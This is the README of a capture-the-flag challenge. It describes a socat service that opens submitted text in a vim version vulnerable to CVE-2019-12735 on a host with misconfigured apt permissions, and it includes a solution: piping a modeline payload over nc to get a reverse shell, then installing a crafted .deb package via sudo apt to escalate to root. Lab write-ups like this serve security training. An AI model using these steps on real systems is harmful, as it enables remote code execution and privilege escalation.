# Obituary

```text
Hey, shoot me over your latest version of the code. I have a simple nc session up, just pass it over when you're ready.

You're using vim, right? You should use it; it'll change your life. I basically depend on it for everything these days!
```

## Setup

1. `docker build -t obituary .`
2. `docker run --rm -d obituary`

## Brief Dev Description

Simple socat server which, per session, accepts a stream of text and writes it to a `mktemp`'d file. When the TCP
stream is closed, the file is opened with vim (via screen), then closed and deleted after 5 seconds.

Unfortunately for the host, the specific (I mean real specific) version of vim used is vulnerable to CVE-2019-12735.
Additionally, the user has left a apt source list as global rw and NOPASSWD'd apt.

## Solution, pt 1

```sh
#!/bin/bash

cat solution/pt1/payload.txt | nc -q 1 172.30.0.2 4321 &
nc -lvnp 4444
```

`payload.txt` is simply a *slightly* modified version of
[this](https://github.com/numirias/security/blob/master/data/2019-06-04_ace-vim-neovim/shell.txt).

You may need to modify the IPs in payload.txt and that shown above, but I doubt it.

## Solution, pt 2

1. `sudo apt install dh-make` (only on debian-based distros; you can do this on other distros with other tools)
2. `cd solution/pt2`
3. `./build.sh`
4. In the shell gained from pt1: `nc -lp 5555 > exploit_0_all.deb`
5. Original shell: `cat exploit_0_all.deb | nc -q 1 172.30.0.2 5555`
6. pt1 shell: `sudo apt -y install ./exploit_0_all.deb`
